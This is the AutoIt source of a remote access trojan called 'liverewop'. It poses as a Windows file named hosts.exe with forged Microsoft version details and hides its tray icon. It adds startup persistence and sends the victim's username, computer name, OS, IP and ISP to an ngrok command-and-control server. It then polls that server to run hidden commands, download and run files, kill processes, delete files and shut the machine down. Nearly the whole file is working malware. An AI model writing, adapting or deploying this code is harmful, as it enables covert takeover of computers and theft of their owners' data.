#NoTrayIcon
#include <Inet.au3>
#include <APIDiagConstants.au3>
#include <Crypt.au3>
#include <StringConstants.au3>
;User vars
Global $liverewop_version = "1.1"
Global $liverewop_cc = "http://d019c8afe6c5.ngrok.io"
;Run
Global $url = "" & $liverewop_cc & ""
If NOT (_inetgetsource($url) = "") Then
Else
	Exit
EndIf
#pragma compile(Icon, icon.ico)
#pragma compile(Out, hosts.exe)
#pragma compile(UPX, True)
#pragma compile(FileDescription, Windows Hosts)
#pragma compile(ProductName, HOSTS.EXE)
#pragma compile(ProductVersion, 1.1)
#pragma compile(FileVersion, 1.1)
#pragma compile(LegalCopyright, © Mcrsoft Corpration.)
;Web APIs
Global $liverewop_eip = "http://wtfismyip.com/text"
Global $liverewop_ipapi = _inetgetsource($liverewop_eip)

Global $liverewop_isp = "http://ip-api.com/line/?fields=isp"
Local $suniqueid = _gethardwareid($uhid_all)
Global $liverewop_panel = "" & $liverewop_cc & "/cmd.php?hwid=" & $suniqueid & ""
Global $liverewop_getisp = _inetgetsource($liverewop_isp)
Global $liverewop_geteip = _inetgetsource($liverewop_eip)
Global $tmpdir = @TempDir
Global $liverewop_pcname = @ComputerName
ConsoleWrite("["& _nowdate() & " " & _nowtime() &"] Agent Started!")
Func pers()
	Local Const $sfilepath = @StartupDir & "\run.lnk"
	FileCreateShortcut(@AppDataDir & "\hosts.exe", $sfilepath, @AppDataDir, "/e,c:\", "Windows Hosts", @SystemDir & "\shell32.dll", "^!t", "15", @SW_HIDE)
	Local $adetails = FileGetShortcut($sfilepath)
    FileCopy(@ScriptFullPath, @AppDataDir & "\hosts.exe", 1)
EndFunc
sleep(5000)
pers()
Func liverewop_postreq()
	Local $suniqueid = _gethardwareid($uhid_all)
	$data = "date=" & _nowdate() & " " & _nowtime() & "&hwid=" & $suniqueid & "&username=" & @UserName & "&computername=" & @ComputerName & "&os=" & @OSVersion & "&osarch=" & @OSArch & "&eip=" & $liverewop_geteip & "&isp=" & $liverewop_getisp & ""
	$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$oHTTP.Open("POST", ""&$liverewop_cc&"/getinfo.php", False)
	$oHTTP.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36")
	$oHTTP.SetRequesHeader("Referer", "https://www.google.com/?q=how+to+install+antivirus")
	$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	$oHTTP.Send($data)
	$oReceived = $oHTTP.ResponseText
	ConsoleWrite($oReceived)
EndFunc
Func MyErrFunc()
Endfunc
liverewop_postreq()
While (1)
	$con = _inetgetsource($liverewop_panel)
	Sleep(1000)
	If $con Then
		liverewopt0f()
	EndIf
WEnd

Func liverewopt0f()
    If StringInStr($con, "RUN?", 2) Then ; Runs cmd command on local machine
		$cmd = StringSplit($con, "?")
	    Run($cmd[2], "", @SW_HIDE)

    ElseIf StringInStr($con, "KILL?", 2) Then ; Kills proccess by name on local machine without .exe extension
		$cmd = StringSplit($con, "?")
        Run("TASKKILL /F /IM " & $cmd[2] & ".exe", "", @SW_HIDE)

    ElseIf StringInStr($con, "DOWNLOAD?", 2) Then ; Downloads file to local machine from a direct download link
		$cmd = StringSplit($con, "?")				;DOWNLOAD?http://seila.com/seila.exe?malware.exe
        InetGet($cmd[2], $cmd[3], 1, 0)

    ElseIf StringInStr($con, "DELETE?", 2) Then ; Deletes file from local machine
		$cmd = StringSplit($con, "?")
        FileDelete($cmd[2])

    ElseIf StringInStr($con, "UNISTALL", 2) Then ; Remove agent persistence
        FileDelete(@StartupDir & "\run.lnk")

    ElseIf StringInStr($con, "REINFECT", 2) Then ; Reinfect agent
        pers()

    ElseIf StringInStr($con, "SHUTDOWN", 2) Then ; Shutdowns local machine via cmd
		Shutdown(6)

    ElseIf StringInStr($con, "RESTART", 2) Then ; Restarts local machine via cmd
		Shutdown(2)
    EndIf
 EndFunc

;Get HWID
Func _gethardwareid($iflags = Default, $bis64bit = Default)
	Local $sbit = @AutoItX64 ? "64" : ""
	If IsBool($bis64bit) Then
		$sbit = $bis64bit AND @AutoItX64 ? "64" : ""
	EndIf
	If $iflags == Default Then
		$iflags = $uhid_mb
	EndIf
	Local $asystem = ["Identifier", "VideoBiosDate", "VideoBiosVersion"], $iresult = 0, $shklm = "HKEY_LOCAL_MACHINE" & $sbit, $soutput = "", $stext = ""
	For $i = 0 To UBound($asystem) - 1
		$soutput &= RegRead($shklm & "\HARDWARE\DESCRIPTION\System\", $asystem[$i])
	Next
	$soutput &= @CPUArch
	$soutput = StringStripWS($soutput, $str_stripall)
	If BitAND($iflags, $uhid_bios) Then
		Local $abios = ["BaseBoardManufacturer", "BaseBoardProduct", "BaseBoardVersion", "BIOSVendor", "BIOSReleaseDate"]
		$stext = ""
		For $i = 0 To UBound($abios) - 1
			$stext &= RegRead($shklm & "\HARDWARE\DESCRIPTION\System\BIOS\", $abios[$i])
		Next
		$stext = StringStripWS($stext, $str_stripall)
		If $stext Then
			$iresult += $uhid_bios
			$soutput &= $stext
		EndIf
	EndIf
	If BitAND($iflags, $uhid_cpu) Then
		Local $aprocessor = ["ProcessorNameString", "~MHz", "Identifier", "VendorIdentifier"]
		$stext = ""
		For $i = 0 To UBound($aprocessor) - 1
			$stext &= RegRead($shklm & "\HARDWARE\DESCRIPTION\System\CentralProcessor\0\", $aprocessor[$i])
		Next
		For $i = 0 To UBound($aprocessor) - 1
			$stext &= RegRead($shklm & "\HARDWARE\DESCRIPTION\System\CentralProcessor\1\", $aprocessor[$i])
		Next
		$stext = StringStripWS($stext, $str_stripall)
		If $stext Then
			$iresult += $uhid_cpu
			$soutput &= $stext
		EndIf
	EndIf
	If BitAND($iflags, $uhid_hdd) Then
		Local $adrives = DriveGetDrive("FIXED")
		$stext = ""
		For $i = 1 To UBound($adrives) - 1
			$stext &= DriveGetSerial($adrives[$i])
		Next
		$stext = StringStripWS($stext, $str_stripall)
		If $stext Then
			$iresult += $uhid_hdd
			$soutput &= $stext
		EndIf
	EndIf
	Local $shash = StringTrimLeft(_crypt_hashdata($soutput, $calg_md5), StringLen("0x"))
	If NOT $shash Then
		Return SetError(1, 0, NULL )
	EndIf
	Return SetExtended($iresult, StringRegExpReplace($shash, "([[:xdigit:]]{8})([[:xdigit:]]{4})([[:xdigit:]]{4})([[:xdigit:]]{4})([[:xdigit:]]{12})", "{\1-\2-\3-\4-\5}"))
EndFunc